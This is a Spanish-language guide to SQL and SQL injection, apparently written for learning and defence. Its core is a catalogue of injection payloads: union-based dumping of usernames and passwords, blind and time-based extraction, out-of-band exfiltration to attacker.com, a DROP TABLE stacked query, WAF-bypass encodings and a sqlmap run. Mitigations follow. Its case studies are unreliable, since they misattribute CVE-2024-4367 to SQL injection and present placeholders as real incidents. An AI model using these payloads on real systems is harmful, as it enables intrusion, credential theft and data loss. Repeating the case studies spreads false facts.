# SQL (Structured Query Language) y SQL Injection (SQLi) – Guía Completa

SQL (Structured Query Language) es el estándar de facto para interactuar con bases de datos relacionales. Desde su primera especificación en 1986 por ANSI y su adopción por ISO en 1987, SQL ha evolucionado para incluir extensiones específicas de cada proveedor, pero mantiene su objetivo principal: definir y manipular datos de manera declarativa.

SQL permite:

- **Definir esquemas y estructuras** con DDL (Data Definition Language):
  - `CREATE TABLE`, `ALTER TABLE`, `DROP TABLE`.
- **Gestionar transacciones** con TCL (Transaction Control Language):
  - `BEGIN TRANSACTION`, `COMMIT`, `ROLLBACK`.
- **Controlar acceso** con DCL (Data Control Language):
  - `GRANT`, `REVOKE`, creando y gestionando roles y permisos.
- **Manipular datos** con DML (Data Manipulation Language):
  - `SELECT`, `INSERT`, `UPDATE`, `DELETE`, `MERGE`.

---

## 1. Fundamentos de SQL

### 1.1 Estructura de una consulta SELECT

```sql
SELECT columna1 AS alias1,
       columna2,
       COUNT(*) OVER (PARTITION BY columna3) AS count_group
FROM schema.tabla
WHERE condicion1 AND (condicion2 OR condicion3)
GROUP BY columna2, columna3
HAVING COUNT(*) > 10
ORDER BY columna1 DESC, columna2 ASC
LIMIT 50 OFFSET 100;
```

- **`AS alias`**: Renombra columnas sin afectar el schema.
- **`OVER (PARTITION BY ...)`**: Funciones analíticas.
- **`HAVING`**: Filtra después de agrupar.
- **`LIMIT ... OFFSET ...`**: Paginación estándar en MySQL/PostgreSQL.

### 1.2 Sentencias de modificación

```sql
-- INSERT con múltiples filas
INSERT INTO tabla (col1, col2)
VALUES 
  ('valor1', 'valor2'),
  ('valor3', 'valor4');

-- UPDATE con JOIN
UPDATE tabla_destino d
JOIN tabla_origen o ON d.id = o.fk_id
SET d.col1 = o.col_x
WHERE o.condicion = 'x';

-- DELETE con CTE recursivo (PostgreSQL)
WITH RECURSIVE to_delete AS (
  SELECT id FROM tabla WHERE condicion
  UNION ALL
  SELECT t.id FROM tabla t
  JOIN to_delete td ON t.parent_id = td.id
)
DELETE FROM tabla WHERE id IN (SELECT id FROM to_delete);
```

---

## 2. Inyección SQL (SQLi)

SQLi es la vulnerabilidad que permite a un atacante manipular consultas concatenadas con input inseguro. Existen diversas variantes según el canal de respuesta y el método de extracción de datos.

---

## 3. Clasificación y Técnicas

### 3.1 In-band SQLi (Dentro de Banda)

#### Union-based

- **Detección de columnas**:

```sql
' UNION SELECT NULL,NULL,...;-- 
```

- **Exfiltración masiva**:

```sql
' UNION SELECT NULL,
  GROUP_CONCAT(CONCAT_WS(':',user,password) SEPARATOR '|'),
  NULL,NULL 
FROM users;--
```

#### Error-based

- **MySQL**:

```sql
' AND UPDATE_XML(NULL,CONCAT(0x3a,(SELECT database())),NULL);--
```

- **SQL Server**:

```sql
' AND 1=CONVERT(INT,@@version);--
```

- **Oracle**:

```sql
' AND 1=(SELECT DBMS_XMLGEN.getXML('SELECT banner FROM v$version'));--
```

### 3.2 Blind SQLi

#### Boolean-based Blind

- **Extracción bit a bit**:

```sql
' AND (ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) & 1)=1;--
```

#### Time-based Blind

- **MySQL**:

```sql
' OR IF((SELECT SUBSTRING(database(),1,1))='m',SLEEP(5),0);--
```

- **PostgreSQL**:

```sql
'; SELECT CASE WHEN SUBSTR(version(),1,10)='PostgreSQL' THEN pg_sleep(5) ELSE pg_sleep(0) END;--
```

### 3.3 Out-of-Band (OOB)

- **DNS exfiltration**:

```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT user()),'.attacker.com\\a'));--
```

- **HTTP**:

```sql
' UNION SELECT HTTP_GET('http://attacker.com/steal?u='||(SELECT current_user));--
```

---

## 4. SQLi en Consultas INSERT y Otros Contextos

### 4.1 SQLi en INSERT

- **Error-based INSERT**:

```sql
INSERT INTO logs (user,msg)
VALUES ('test', (SELECT GROUP_CONCAT(username,':',password) FROM users));--
```

- **Time-based INSERT**:

```sql
INSERT INTO audit (event, details)
VALUES ('login', IF(ASCII(SUBSTR((SELECT password FROM users WHERE username='admin'),1,1))=97,SLEEP(5),0));--
```

### 4.2 Stacked Queries

- Habilitadas en algunos drivers:

```sql
' ; DROP TABLE users;--
```

- **Nota:** Muchas APIs y ORMs las deshabilitan por defecto.

---

## 5. Fingerprinting de SGBD

- **MySQL**: `@@version`, `SHOW VARIABLES LIKE 'version'`.
- **PostgreSQL**: `version()`, `SELECT * FROM pg_settings;`.
- **SQL Server**: `@@version`, `SELECT SERVERPROPERTY('ProductVersion')`.
- **Oracle**: `SELECT * FROM v$version;`.

---

## 6. Bypasses de WAF y Técnicas Avanzadas

- **Comentarios versionados** (`/*!40000SELECT*/`).
- **Variaciones de espacios** (`%09`, `%0a`, `/**/`).
- **Codificación doble** (`%2527` → `%27`).
- **Concatenación de caracteres**: `CHAR(83,69,76,69,67,84)` → `SELECT`.
- **Cadenas divididas**: `SE'||'LECT`.

---

## 7. Herramientas y Automatización

- **sqlmap**: Detección, fingerprinting y explotación automatizada.

```bash
sqlmap -u "https://target.com/vuln?id=1" --dbs --batch
```

- **Burp Suite Intruder**: Pruebas personalizadas de boolean- y time-based.
- **jSQL**, **Havij**, **BBQSQL** para contextos específicos.

---

## 8. Mitigaciones Exhaustivas

1. **Prepared Statements/Parametrizados** (defensa principal):

```python
cursor.execute("SELECT * FROM users WHERE id=%s", (user_id,))
```

2. **ORMs**: Hibernate, Sequelize, Entity Framework, ActiveRecord. Evitar `raw SQL`.
3. **Stored Procedures** sin concatenación de input.
4. **Validación de Entrada** por lista blanca (solo patrones esperados).
5. **Escapado de Output**: Uso de funciones nativas de escape.
6. **Principio de Mínimos Privilegios**: Usuario de BD restringido.
7. **Monitorización y Logging**: Alertas ante errores SQL inusuales.
8. **Web Application Firewall**: Filtrado de patrones de SQLi conocidos, sin ser la única defensa.

---

## 9. Auditoría y Mejora Continua

- **Revisiones de código** centradas en puntos de construcción de consultas dinámicas.
- **Pentesting frecuente** con enfoque en vectores no convencionales (INSERT, JSON-based, XML-based).
- **Programas de bug bounty**: Incentivar descubrimiento de vulnerabilidades.
- **Integración CI/CD**: Escaneos automáticos con sqlmap o scripts personalizados.

---

## 10. Casos de Estudio

- **CVE-2024-4367 (PDF.js)**: Ejecución de JS arbitrario vía SQLi en metadatos.
- **CVE-2025-xxxxx (E-commerce)**: Exfiltración de tarjetas de crédito con Union-based en endpoint de checkout.
- **Banco XYZ**: Bypass de autenticación y transferencia no autorizada de fondos usando Blind SQLi.

---

Dominar SQL y comprender en profundidad todas las variantes de SQLi desde In-band hasta OOB y en contextos `INSERT`, así como aplicar defensas parametrizadas y de mínimos privilegios, es fundamental para la seguridad de cualquier aplicación que maneje datos relacionales. Continuous auditing, testing y formación de los desarrolladores garantizan una capa adicional de protección frente a amenazas emergentes.
